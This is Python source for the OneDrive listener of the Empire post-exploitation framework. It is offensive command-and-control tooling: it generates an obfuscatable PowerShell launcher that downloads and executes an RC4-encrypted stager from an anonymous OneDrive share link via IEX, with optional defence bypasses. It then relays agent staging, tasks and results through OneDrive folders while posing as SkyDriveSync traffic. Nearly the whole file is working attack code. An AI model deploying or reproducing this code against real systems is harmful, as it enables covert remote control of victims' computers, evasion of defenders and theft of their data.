from __future__ import print_function

import base64
import copy
import json
import os
import re
import time
import traceback
from builtins import object, str
from typing import List

from pydispatch import dispatcher
from requests import Request, Session

from empire.server.common import encryption, helpers, templating
from empire.server.utils import data_util, listener_util


class Listener(object):
    def __init__(self, mainMenu, params=[]):
        self.info = {
            "Name": "Onedrive",
            "Author": ["@mr64bit"],
            "Description": (
                "Starts a Onedrive listener. Setup instructions here:        gist.github.com/mr64bit/3fd8f321717c9a6423f7949d494b6cd9"
            ),
            "Category": ("third_party"),
            "Comments": [
                "Note that deleting STAGE0-PS.txt from the staging folder will break existing launchers"
            ],
        }

        self.options = {
            "Name": {
                "Description": "Name for the listener.",
                "Required": True,
                "Value": "onedrive",
            },
            "ClientID": {
                "Description": "Application ID of the OAuth App.",
                "Required": True,
                "Value": "",
            },
            "ClientSecret": {
                "Description": "Client secret of the OAuth App.",
                "Required": True,
                "Value": "",
            },
            "AuthCode": {
                "Description": "Auth code given after authenticating OAuth App.",
                "Required": True,
                "Value": "",
            },
            "BaseFolder": {
                "Description": "The base Onedrive folder to use for comms.",
                "Required": True,
                "Value": "empire",
            },
            "StagingFolder": {
                "Description": "The nested Onedrive staging folder.",
                "Required": True,
                "Value": "staging",
            },
            "TaskingsFolder": {
                "Description": "The nested Onedrive taskings folder.",
                "Required": True,
                "Value": "taskings",
            },
            "ResultsFolder": {
                "Description": "The nested Onedrive results folder.",
                "Required": True,
                "Value": "results",
            },
            "Launcher": {
                "Description": "Launcher string.",
                "Required": True,
                "Value": "powershell -noP -sta -w 1 -enc ",
            },
            "StagingKey": {
                "Description": "Staging key for initial agent negotiation.",
                "Required": True,
                "Value": "asdf",
            },
            "PollInterval": {
                "Description": "Polling interval (in seconds) to communicate with Onedrive.",
                "Required": True,
                "Value": "5",
            },
            "DefaultDelay": {
                "Description": "Agent delay/reach back interval (in seconds).",
                "Required": True,
                "Value": 10,
            },
            "DefaultJitter": {
                "Description": "Jitter in agent reachback interval (0.0-1.0).",
                "Required": True,
                "Value": 0.0,
            },
            "DefaultLostLimit": {
                "Description": "Number of missed checkins before exiting",
                "Required": True,
                "Value": 10,
            },
            "DefaultProfile": {
                "Description": "Default communication profile for the agent.",
                "Required": True,
                "Value": "N/A|Microsoft SkyDriveSync 17.005.0107.0008 ship; Windows NT 10.0 (16299)",
            },
            "KillDate": {
                "Description": "Date for the listener to exit (MM/dd/yyyy).",
                "Required": False,
                "Value": "",
            },
            "WorkingHours": {
                "Description": "Hours for the agent to operate (09:00-17:00).",
                "Required": False,
                "Value": "",
            },
            "RefreshToken": {
                "Description": "Refresh token used to refresh the auth token",
                "Required": False,
                "Value": "",
            },
            "RedirectURI": {
                "Description": "Redirect URI of the registered application",
                "Required": True,
                "Value": "https://login.live.com/oauth20_desktop.srf",
            },
            "SlackURL": {
                "Description": "Your Slack Incoming Webhook URL to communicate with your Slack instance.",
                "Required": False,
                "Value": "",
            },
        }

        self.mainMenu = mainMenu
        self.threads = {}

        self.options["StagingKey"]["Value"] = str(
            data_util.get_config("staging_key")[0]
        )

    def default_response(self):
        return ""

    def validate_options(self):

        self.uris = [
            a.strip("/")
            for a in self.options["DefaultProfile"]["Value"].split("|")[0].split(",")
        ]

        # If we don't have an OAuth code yet, give the user a URL to get it
        if (str(self.options["RefreshToken"]["Value"]).strip() == "") and (
            str(self.options["AuthCode"]["Value"]).strip() == ""
        ):
            if str(self.options["ClientID"]["Value"]).strip() == "":
                print(helpers.color("[!] ClientID needed to generate AuthCode URL!"))
                return "[!] ClientID needed to generate AuthCode URL!"
            params = {
                "client_id": str(self.options["ClientID"]["Value"]).strip(),
                "response_type": "code",
                "redirect_uri": self.options["RedirectURI"]["Value"],
                "scope": "files.readwrite offline_access",
            }
            req = Request(
                "GET",
                "https://login.microsoftonline.com/common/oauth2/v2.0/authorize",
                params=params,
            )
            prep = req.prepare()
            print(
                helpers.color(
                    '[*] Get your AuthCode from "%s" and try starting the listener again.'
                    % prep.url
                )
            )
            return f'[*] Get your AuthCode from "{prep.url}" and try starting the listener again.'

        for key in self.options:
            if self.options[key]["Required"] and (
                str(self.options[key]["Value"]).strip() == ""
            ):
                print(helpers.color('[!] Option "%s" is required.' % (key)))
                return '[!] Option "%s" is required.' % (key)

        return True

    def generate_launcher(
        self,
        encode=True,
        obfuscate=False,
        obfuscationCommand="",
        userAgent="default",
        proxy="default",
        proxyCreds="default",
        stagerRetries="0",
        language=None,
        safeChecks="",
        listenerName=None,
        bypasses: List[str] = None,
    ):
        bypasses = [] if bypasses is None else bypasses

        if not language:
            print(
                helpers.color(
                    "[!] listeners/onedrive generate_launcher(): No language specified"
                )
            )

        if (
            listenerName
            and (listenerName in self.threads)
            and (listenerName in self.mainMenu.listeners.activeListeners)
        ):
            listener_options = self.mainMenu.listeners.activeListeners[listenerName][
                "options"
            ]
            staging_key = listener_options["StagingKey"]["Value"]
            profile = listener_options["DefaultProfile"]["Value"]
            launcher_cmd = listener_options["Launcher"]["Value"]
            staging_key = listener_options["StagingKey"]["Value"]
            poll_interval = listener_options["PollInterval"]["Value"]
            base_folder = listener_options["BaseFolder"]["Value"].strip("/")
            staging_folder = listener_options["StagingFolder"]["Value"]
            taskings_folder = listener_options["TaskingsFolder"]["Value"]
            results_folder = listener_options["ResultsFolder"]["Value"]

            if language.startswith("power"):
                launcher = "$ErrorActionPreference = 'SilentlyContinue';"  # Set as empty string for debugging

                if safeChecks.lower() == "true":
                    launcher = "If($PSVersionTable.PSVersion.Major -ge 3){"

                    for bypass in bypasses:
                        launcher += bypass
                    launcher += (
                        "};[System.Net.ServicePointManager]::Expect100Continue=0;"
                    )

                launcher += "$wc=New-Object System.Net.WebClient;"

                if userAgent.lower() == "default":
                    profile = listener_options["DefaultProfile"]["Value"]
                    userAgent = profile.split("|")[1]
                launcher += f"$u='{ userAgent }';"

                if userAgent.lower() != "none" or proxy.lower() != "none":
                    if userAgent.lower() != "none":
                        launcher += "$wc.Headers.Add('User-Agent',$u);"

                    if proxy.lower() != "none":
                        if proxy.lower() == "default":
                            launcher += (
                                "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
                            )

                        else:
                            launcher += "$proxy=New-Object Net.WebProxy;"
                            launcher += f"$proxy.Address = '{ proxy.lower() }';"
                            launcher += "$wc.Proxy = $proxy;"

                    if proxyCreds.lower() == "default":
                        launcher += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"

                    else:
                        username = proxyCreds.split(":")[0]
                        password = proxyCreds.split(":")[1]
                        domain = username.split("\\")[0]
                        usr = username.split("\\")[1]
                        launcher += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{ password }', '{ domain }');"
                        launcher += "$wc.Proxy.Credentials = $netcred;"

                    launcher += "$Script:Proxy = $wc.Proxy;"

                # code to turn the key string into a byte array
                launcher += (
                    f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
                )

                # this is the minimized RC4 launcher code from rc4.ps1
                launcher += listener_util.powershell_rc4()

                launcher += f"$data=$wc.DownloadData('{ self.mainMenu.listeners.activeListeners[listenerName]['stager_url'] }');"
                launcher += "$iv=$data[0..3];$data=$data[4..$data.length];"
                launcher += "-join[Char[]](& $R $data ($IV+$K))|IEX"

                # Remove comments and make one line
                launcher = helpers.strip_powershell_comments(launcher)
                launcher = data_util.ps_convert_to_oneliner(launcher)

                if obfuscate:
                    launcher = data_util.obfuscate(
                        self.mainMenu.installPath,
                        launcher,
                        obfuscationCommand=obfuscationCommand,
                    )

                if encode and (
                    (not obfuscate) or ("launcher" not in obfuscationCommand.lower())
                ):
                    return helpers.powershell_launcher(launcher, launcher_cmd)
                else:
                    return launcher

            if language.startswith("pyth"):
                print(
                    helpers.color(
                        "[!] listeners/onedrive generate_launcher(): Python agent not implemented yet"
                    )
                )
                return "Python not implemented yet"

        else:
            print(
                helpers.color(
                    "[!] listeners/onedrive generate_launcher(): invalid listener name"
                )
            )

    def generate_stager(
        self, listenerOptions, encode=False, encrypt=True, language=None, token=None
    ):
        """
        Generate the stager code
        """

        if not language:
            print(
                helpers.color(
                    "[!] listeners/onedrive generate_stager(): no language specified"
                )
            )
            return None

        client_id = listenerOptions["ClientID"]["Value"]
        client_secret = listenerOptions["ClientSecret"]["Value"]
        refresh_token = listenerOptions["RefreshToken"]["Value"]
        taskings_folder = listenerOptions["TaskingsFolder"]["Value"]
        results_folder = listenerOptions["ResultsFolder"]["Value"]
        redirect_uri = listenerOptions["RedirectURI"]["Value"]
        staging_key = listenerOptions["StagingKey"]["Value"]
        base_folder = listenerOptions["BaseFolder"]["Value"]
        staging_folder = listenerOptions["StagingFolder"]["Value"]
        working_hours = listenerOptions["WorkingHours"]["Value"]
        agent_delay = listenerOptions["DefaultDelay"]["Value"]

        if language.lower() == "powershell":
            template_path = [
                os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
            ]

            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("onedrive/onedrive.ps1")

            template_options = {
                "working_hours": working_hours,
                "staging_key": staging_key,
                "token": token,
                "refresh_token": refresh_token,
                "client_id": client_id,
                "client_secret": client_secret,
                "redirect_uri": redirect_uri,
                "base_folder": base_folder,
                "results_folder": results_folder,
                "poll_interval": str(agent_delay),
                "redirect_uri": redirect_uri,
                "base_folder": base_folder,
                "staging_folder": staging_folder,
                "taskings_folder": taskings_folder,
            }
            stager = template.render(template_options)

            # Get the random function name generated at install and patch the stager with the proper function name
            stager = data_util.keyword_obfuscation(stager)
            unobfuscated_stager = listener_util.remove_lines_comments(stager)

            if encode:
                return helpers.enc_powershell(unobfuscated_stager)
            elif encrypt:
                RC4IV = os.urandom(4)
                staging_key = staging_key.encode("UTF-8")
                return RC4IV + encryption.rc4(
                    RC4IV + staging_key, unobfuscated_stager.encode("UTF-8")
                )
            else:
                return unobfuscated_stager

        else:
            print(helpers.color("[!] Python agent not available for Onedrive"))

    def generate_comms(
        self,
        listener_options,
        client_id,
        client_secret,
        token,
        refresh_token,
        redirect_uri,
        language=None,
    ):
        client_id = listener_options["ClientID"]["Value"]
        client_secret = listener_options["ClientSecret"]["Value"]
        refresh_token = listener_options["RefreshToken"]["Value"]
        base_folder = listener_options["BaseFolder"]["Value"]
        results_folder = listener_options["ResultsFolder"]["Value"]
        redirect_uri = listener_options["RedirectURI"]["Value"]
        taskings_folder = listener_options["TaskingsFolder"]["Value"]

        if language:
            if language.lower() == "powershell":
                template_path = [
                    os.path.join(self.mainMenu.installPath, "/data/agent/stagers"),
                    os.path.join(self.mainMenu.installPath, "./data/agent/stagers"),
                ]

                eng = templating.TemplateEngine(template_path)
                template = eng.get_template("onedrive/comms.ps1")

                template_options = {
                    "token:": token,
                    "refresh_token": refresh_token,
                    "client_id": client_id,
                    "client_secret": client_secret,
                    "redirect_uri": redirect_uri,
                    "base_folder": base_folder,
                    "results_folder": results_folder,
                    "taskings_folder": taskings_folder,
                }

                comms = template.render(template_options)
                return comms

            else:
                print(
                    helpers.color(
                        "[!] listeners/onedrive generate_comms(): invalid language specification, only 'powershell' is currently supported for this module."
                    )
                )
        else:
            print(
                helpers.color(
                    "[!] listeners/onedrive generate_comms(): no language specified!"
                )
            )

    def generate_agent(
        self,
        listener_options,
        client_id,
        client_secret,
        token,
        refresh_token,
        redirect_uri,
        language=None,
        version="",
    ):
        """
        Generate the agent code
        """

        if not language:
            print(
                helpers.color(
                    "[!] listeners/onedrive generate_agent(): No language specified"
                )
            )
            return

        language = language.lower()
        delay = listener_options["DefaultDelay"]["Value"]
        jitter = listener_options["DefaultJitter"]["Value"]
        profile = listener_options["DefaultProfile"]["Value"]
        lost_limit = listener_options["DefaultLostLimit"]["Value"]
        working_hours = listener_options["WorkingHours"]["Value"]
        kill_date = listener_options["KillDate"]["Value"]
        b64_default_response = base64.b64encode(self.default_response().encode("UTF-8"))

        if language == "powershell":
            f = open(self.mainMenu.installPath + "/data/agent/agent.ps1")
            agent_code = f.read()
            f.close()

            agent_code = data_util.keyword_obfuscation(agent_code)

            agent_code = helpers.strip_powershell_comments(agent_code)

            agent_code = agent_code.replace(
                "$AgentDelay = 60", "$AgentDelay = " + str(delay)
            )
            agent_code = agent_code.replace(
                "$AgentJitter = 0", "$AgentJitter = " + str(jitter)
            )
            agent_code = agent_code.replace(
                '$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                '$Profile = "' + str(profile) + '"',
            )
            agent_code = agent_code.replace(
                "$LostLimit = 60", "$LostLimit = " + str(lost_limit)
            )
            agent_code = agent_code.replace(
                '$DefaultResponse = ""',
                '$DefaultResponse = "' + b64_default_response.decode("UTF-8") + '"',
            )

            if kill_date != "":
                agent_code = agent_code.replace(
                    "$KillDate,", "$KillDate = '" + str(kill_date) + "',"
                )

            agent_code = agent_code.replace("REPLACE_COMMS", "")

            return agent_code

    def start_server(self, listenerOptions):

        # Utility functions to handle auth tasks and initial setup
        def get_token(client_id, client_secret, code):
            params = {
                "client_id": client_id,
                "client_secret": client_secret,
                "grant_type": "authorization_code",
                "scope": "files.readwrite offline_access",
                "code": code,
                "redirect_uri": redirect_uri,
            }
            try:
                r = s.post(
                    "https://login.microsoftonline.com/common/oauth2/v2.0/token",
                    data=params,
                )
                r_token = r.json()
                r_token["expires_at"] = time.time() + (int)(r_token["expires_in"]) - 15
                r_token["update"] = True
                return r_token
            except KeyError as e:
                print(
                    helpers.color(
                        "[!] Something went wrong, HTTP response %d, error code %s: %s"
                        % (
                            r.status_code,
                            r.json()["error_codes"],
                            r.json()["error_description"],
                        )
                    )
                )
                raise

        def renew_token(client_id, client_secret, refresh_token):
            params = {
                "client_id": client_id,
                "client_secret": client_secret,
                "grant_type": "refresh_token",
                "scope": "files.readwrite offline_access",
                "refresh_token": refresh_token,
                "redirect_uri": redirect_uri,
            }
            try:
                r = s.post(
                    "https://login.microsoftonline.com/common/oauth2/v2.0/token",
                    data=params,
                )
                r_token = r.json()
                r_token["expires_at"] = time.time() + (int)(r_token["expires_in"]) - 15
                r_token["update"] = True
                return r_token
            except KeyError as e:
                print(
                    helpers.color(
                        "[!] Something went wrong, HTTP response %d, error code %s: %s"
                        % (
                            r.status_code,
                            r.json()["error_codes"],
                            r.json()["error_description"],
                        )
                    )
                )
                raise

        def test_token(token):
            headers = s.headers.copy()
            headers["Authorization"] = "Bearer " + token

            request = s.get("%s/drive" % base_url, headers=headers)

            return request.ok

        def setup_folders():
            if not (test_token(token["access_token"])):
                raise ValueError("Could not set up folders, access token invalid")

            base_object = s.get("%s/drive/root:/%s" % (base_url, base_folder))
            if not (base_object.status_code == 200):
                print(helpers.color("[*] Creating %s folder" % base_folder))
                params = {
                    "@microsoft.graph.conflictBehavior": "rename",
                    "folder": {},
                    "name": base_folder,
                }
                base_object = s.post(
                    "%s/drive/items/root/children" % base_url, json=params
                )
            else:
                message = "[*] {} folder already exists".format(base_folder)
                signal = json.dumps({"print": True, "message": message})
                dispatcher.send(
                    signal, sender="listeners/onedrive/{}".format(listener_name)
                )

            for item in [staging_folder, taskings_folder, results_folder]:
                item_object = s.get(
                    "%s/drive/root:/%s/%s" % (base_url, base_folder, item)
                )
                if not (item_object.status_code == 200):
                    print(
                        helpers.color("[*] Creating %s/%s folder" % (base_folder, item))
                    )
                    params = {
                        "@microsoft.graph.conflictBehavior": "rename",
                        "folder": {},
                        "name": item,
                    }
                    item_object = s.post(
                        "%s/drive/items/%s/children"
                        % (base_url, base_object.json()["id"]),
                        json=params,
                    )
                else:
                    message = "[*] {}/{} already exists".format(base_folder, item)
                    signal = json.dumps({"print": True, "message": message})
                    dispatcher.send(
                        signal, sender="listeners/onedrive/{}".format(listener_name)
                    )

        def upload_launcher():
            ps_launcher = self.mainMenu.stagers.generate_launcher(
                listener_name,
                language="powershell",
                encode=False,
                userAgent="none",
                proxy="none",
                proxyCreds="none",
            )

            r = s.put(
                "%s/drive/root:/%s/%s/%s:/content"
                % (base_url, base_folder, staging_folder, "LAUNCHER-PS.TXT"),
                data=ps_launcher,
                headers={"Content-Type": "text/plain"},
            )

            if r.status_code == 201 or r.status_code == 200:
                item = r.json()
                r = s.post(
                    "%s/drive/items/%s/createLink" % (base_url, item["id"]),
                    json={"scope": "anonymous", "type": "view"},
                    headers={"Content-Type": "application/json"},
                )
                launcher_url = (
                    "https://api.onedrive.com/v1.0/shares/%s/driveitem/content"
                    % r.json()["shareId"]
                )

        def upload_stager():
            ps_stager = self.generate_stager(
                listenerOptions=listener_options,
                language="powershell",
                token=token["access_token"],
            )
            r = s.put(
                "%s/drive/root:/%s/%s/%s:/content"
                % (base_url, base_folder, staging_folder, "STAGE0-PS.txt"),
                data=ps_stager,
                headers={"Content-Type": "application/octet-stream"},
            )
            if r.status_code == 201 or r.status_code == 200:
                item = r.json()
                r = s.post(
                    "%s/drive/items/%s/createLink" % (base_url, item["id"]),
                    json={"scope": "anonymous", "type": "view"},
                    headers={"Content-Type": "application/json"},
                )
                stager_url = (
                    "https://api.onedrive.com/v1.0/shares/%s/driveitem/content"
                    % r.json()["shareId"]
                )
                # Different domain for some reason?
                self.mainMenu.listeners.activeListeners[listener_name][
                    "stager_url"
                ] = stager_url

            else:
                print(helpers.color("[!] Something went wrong uploading stager"))
                message = r.content
                signal = json.dumps({"print": True, "message": message})
                dispatcher.send(
                    signal, sender="listeners/onedrive/{}".format(listener_name)
                )

        listener_options = copy.deepcopy(listenerOptions)

        listener_name = listener_options["Name"]["Value"]
        staging_key = listener_options["StagingKey"]["Value"]
        poll_interval = listener_options["PollInterval"]["Value"]
        client_id = listener_options["ClientID"]["Value"]
        client_secret = listener_options["ClientSecret"]["Value"]
        auth_code = listener_options["AuthCode"]["Value"]
        refresh_token = listener_options["RefreshToken"]["Value"]
        base_folder = listener_options["BaseFolder"]["Value"]
        staging_folder = listener_options["StagingFolder"]["Value"]
        taskings_folder = listener_options["TaskingsFolder"]["Value"]
        results_folder = listener_options["ResultsFolder"]["Value"]
        redirect_uri = listener_options["RedirectURI"]["Value"]
        base_url = "https://graph.microsoft.com/v1.0"

        s = Session()

        if refresh_token:
            token = renew_token(client_id, client_secret, refresh_token)
            message = "[*] Refreshed auth token"
            signal = json.dumps({"print": True, "message": message})
            dispatcher.send(
                signal, sender="listeners/onedrive/{}".format(listener_name)
            )
        else:
            try:
                token = get_token(client_id, client_secret, auth_code)
            except:
                print(helpers.color("[!] Unable to retrieve OneDrive Token"))
                return

            message = "[*] Got new auth token"
            signal = json.dumps({"print": True, "message": message})
            dispatcher.send(signal, sender="listeners/onedrive")

        s.headers["Authorization"] = "Bearer " + token["access_token"]

        setup_folders()

        while True:
            # Wait until Empire is aware the listener is running, so we can save our refresh token and stager URL
            try:
                if listener_name in list(
                    self.mainMenu.listeners.activeListeners.keys()
                ):
                    upload_stager()
                    upload_launcher()
                    break
                else:
                    time.sleep(1)
            except AttributeError:
                time.sleep(1)

        while True:
            time.sleep(int(poll_interval))
            try:  # Wrap the whole loop in a try/catch so one error won't kill the listener
                if (
                    time.time() > token["expires_at"]
                ):  # Get a new token if the current one has expired
                    token = renew_token(
                        client_id, client_secret, token["refresh_token"]
                    )
                    s.headers["Authorization"] = "Bearer " + token["access_token"]
                    message = "[*] Refreshed auth token"
                    signal = json.dumps({"print": True, "message": message})
                    dispatcher.send(
                        signal, sender="listeners/onedrive/{}".format(listener_name)
                    )
                    upload_stager()
                if token["update"]:
                    self.mainMenu.listeners.update_listener_options(
                        listener_name, "RefreshToken", token["refresh_token"]
                    )
                    token["update"] = False

                search = s.get(
                    "%s/drive/root:/%s/%s?expand=children"
                    % (base_url, base_folder, staging_folder)
                )
                for item in search.json()[
                    "children"
                ]:  # Iterate all items in the staging folder
                    try:
                        reg = re.search("^([A-Z0-9]+)_([0-9]).txt", item["name"])
                        if not reg:
                            continue
                        agent_name, stage = reg.groups()
                        if stage == "1":  # Download stage 1, upload stage 2
                            message = "[*] Downloading {}/{}/{} {}".format(
                                base_folder, staging_folder, item["name"], item["size"]
                            )
                            signal = json.dumps({"print": False, "message": message})
                            dispatcher.send(
                                signal,
                                sender="listeners/onedrive/{}".format(listener_name),
                            )
                            content = s.get(
                                item["@microsoft.graph.downloadUrl"]
                            ).content
                            lang, return_val = self.mainMenu.agents.handle_agent_data(
                                staging_key, content, listener_options
                            )[0]
                            message = "[*] Uploading {}/{}/{}_2.txt, {} bytes".format(
                                base_folder,
                                staging_folder,
                                agent_name,
                                str(len(return_val)),
                            )
                            signal = json.dumps({"print": False, "message": message})
                            dispatcher.send(
                                signal,
                                sender="listeners/onedrive/{}".format(listener_name),
                            )
                            s.put(
                                "%s/drive/root:/%s/%s/%s_2.txt:/content"
                                % (base_url, base_folder, staging_folder, agent_name),
                                data=return_val,
                            )
                            message = "[*] Deleting {}/{}/{}".format(
                                base_folder, staging_folder, item["name"]
                            )
                            signal = json.dumps({"print": False, "message": message})
                            dispatcher.send(
                                signal,
                                sender="listeners/onedrive/{}".format(listener_name),
                            )
                            s.delete("%s/drive/items/%s" % (base_url, item["id"]))

                        if (
                            stage == "3"
                        ):  # Download stage 3, upload stage 4 (full agent code)
                            message = "[*] Downloading {}/{}/{}, {} bytes".format(
                                base_folder, staging_folder, item["name"], item["size"]
                            )
                            signal = json.dumps({"print": False, "message": message})
                            dispatcher.send(
                                signal,
                                sender="listeners/onedrive/{}".format(listener_name),
                            )
                            content = s.get(
                                item["@microsoft.graph.downloadUrl"]
                            ).content
                            lang, return_val = self.mainMenu.agents.handle_agent_data(
                                staging_key, content, listener_options
                            )[0]

                            session_key = self.mainMenu.agents.agents[agent_name][
                                "sessionKey"
                            ]
                            agent_token = renew_token(
                                client_id, client_secret, token["refresh_token"]
                            )  # Get auth and refresh tokens for the agent to use
                            agent_code = str(
                                self.generate_agent(
                                    listener_options,
                                    client_id,
                                    client_secret,
                                    agent_token["access_token"],
                                    agent_token["refresh_token"],
                                    redirect_uri,
                                    lang,
                                )
                            )
                            enc_code = encryption.aes_encrypt_then_hmac(
                                session_key, agent_code
                            )

                            message = "[*] Uploading {}/{}/{}_4.txt, {} bytes".format(
                                base_folder,
                                staging_folder,
                                agent_name,
                                str(len(enc_code)),
                            )
                            signal = json.dumps({"print": False, "message": message})
                            dispatcher.send(
                                signal,
                                sender="listeners/onedrive/{}".format(listener_name),
                            )
                            s.put(
                                "%s/drive/root:/%s/%s/%s_4.txt:/content"
                                % (base_url, base_folder, staging_folder, agent_name),
                                data=enc_code,
                            )
                            message = "[*] Deleting {}/{}/{}".format(
                                base_folder, staging_folder, item["name"]
                            )
                            signal = json.dumps({"print": False, "message": message})
                            dispatcher.send(
                                signal,
                                sender="listeners/onedrive/{}".format(listener_name),
                            )
                            s.delete("%s/drive/items/%s" % (base_url, item["id"]))

                    except Exception as e:
                        print(
                            helpers.color(
                                "[!] Could not handle agent staging for listener %s, continuing"
                                % listener_name
                            )
                        )
                        message = traceback.format_exc()
                        signal = json.dumps({"print": False, "message": message})
                        dispatcher.send(
                            signal, sender="listeners/onedrive/{}".format(listener_name)
                        )

                agent_ids = self.mainMenu.agents.get_agents_for_listener(listener_name)

                for agent_id in agent_ids:  # Upload any tasks for the current agents
                    if isinstance(agent_id, bytes):
                        agent_id = agent_id.decode("UTF-8")
                    task_data = self.mainMenu.agents.handle_agent_request(
                        agent_id, "powershell", staging_key, update_lastseen=True
                    )
                    if task_data:
                        try:
                            r = s.get(
                                "%s/drive/root:/%s/%s/%s.txt:/content"
                                % (base_url, base_folder, taskings_folder, agent_id)
                            )
                            if (
                                r.status_code == 200
                            ):  # If there's already something there, download and append the new data
                                task_data = r.content + task_data

                            message = (
                                "[*] Uploading agent tasks for {}, {} bytes".format(
                                    agent_id, str(len(task_data))
                                )
                            )
                            signal = json.dumps({"print": False, "message": message})
                            dispatcher.send(
                                signal,
                                sender="listeners/onedrive/{}".format(listener_name),
                            )

                            r = s.put(
                                "%s/drive/root:/%s/%s/%s.txt:/content"
                                % (base_url, base_folder, taskings_folder, agent_id),
                                data=task_data,
                            )
                        except Exception as e:
                            message = (
                                "[!] Error uploading agent tasks for {}, {}".format(
                                    agent_id, e
                                )
                            )
                            signal = json.dumps({"print": False, "message": message})
                            dispatcher.send(
                                signal,
                                sender="listeners/onedrive/{}".format(listener_name),
                            )

                search = s.get(
                    "%s/drive/root:/%s/%s?expand=children"
                    % (base_url, base_folder, results_folder)
                )
                for item in search.json()[
                    "children"
                ]:  # For each file in the results folder
                    try:
                        agent_id = item["name"].split(".")[0]

                        for i in range(len(agent_ids)):
                            agent_ids[i] = agent_ids[i].decode("UTF-8")

                        if (
                            not agent_id in agent_ids
                        ):  # If we don't recognize that agent, upload a message to restage
                            print(
                                helpers.color(
                                    "[*] Invalid agent, deleting %s/%s and restaging"
                                    % (results_folder, item["name"])
                                )
                            )
                            s.put(
                                "%s/drive/root:/%s/%s/%s.txt:/content"
                                % (base_url, base_folder, taskings_folder, agent_id),
                                data="RESTAGE",
                            )
                            s.delete("%s/drive/items/%s" % (base_url, item["id"]))
                            continue

                        self.mainMenu.agents.update_agent_lastseen_db(agent_id)

                        # If the agent is just checking in, the file will only be 1 byte, so no results to fetch
                        if item["size"] > 1:
                            message = (
                                "[*] Downloading results from {}/{}, {} bytes".format(
                                    results_folder, item["name"], item["size"]
                                )
                            )
                            signal = json.dumps({"print": False, "message": message})
                            dispatcher.send(
                                signal,
                                sender="listeners/onedrive/{}".format(listener_name),
                            )
                            r = s.get(item["@microsoft.graph.downloadUrl"])
                            self.mainMenu.agents.handle_agent_data(
                                staging_key,
                                r.content,
                                listener_options,
                                update_lastseen=True,
                            )
                            message = "[*] Deleting {}/{}".format(
                                results_folder, item["name"]
                            )
                            signal = json.dumps({"print": False, "message": message})
                            dispatcher.send(
                                signal,
                                sender="listeners/onedrive/{}".format(listener_name),
                            )
                            s.delete("%s/drive/items/%s" % (base_url, item["id"]))
                    except Exception as e:
                        message = "[!] Error handling agent results for {}, {}".format(
                            item["name"], e
                        )
                        signal = json.dumps({"print": False, "message": message})
                        dispatcher.send(
                            signal, sender="listeners/onedrive/{}".format(listener_name)
                        )

            except Exception as e:
                print(
                    helpers.color(
                        "[!] Something happened in listener %s: %s, continuing"
                        % (listener_name, e)
                    )
                )
                message = traceback.format_exc()
                signal = json.dumps({"print": False, "message": message})
                dispatcher.send(
                    signal, sender="listeners/onedrive/{}".format(listener_name)
                )

            s.close()

    def start(self, name=""):
        """
        Start a threaded instance of self.start_server() and store it in the
        self.threads dictionary keyed by the listener name.
        """
        listenerOptions = self.options
        if name and name != "":
            self.threads[name] = helpers.KThread(
                target=self.start_server, args=(listenerOptions,)
            )
            self.threads[name].start()
            time.sleep(3)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()
        else:
            name = listenerOptions["Name"]["Value"]
            self.threads[name] = helpers.KThread(
                target=self.start_server, args=(listenerOptions,)
            )
            self.threads[name].start()
            time.sleep(3)
            # returns True if the listener successfully started, false otherwise
            return self.threads[name].is_alive()

    def shutdown(self, name=""):
        """
        Terminates the server thread stored in the self.threads dictionary,
        keyed by the listener name.
        """

        if name and name != "":
            print(helpers.color("[!] Killing listener '%s'" % (name)))
            self.threads[name].kill()
        else:
            print(
                helpers.color(
                    "[!] Killing listener '%s'" % (self.options["Name"]["Value"])
                )
            )
            self.threads[self.options["Name"]["Value"]].kill()
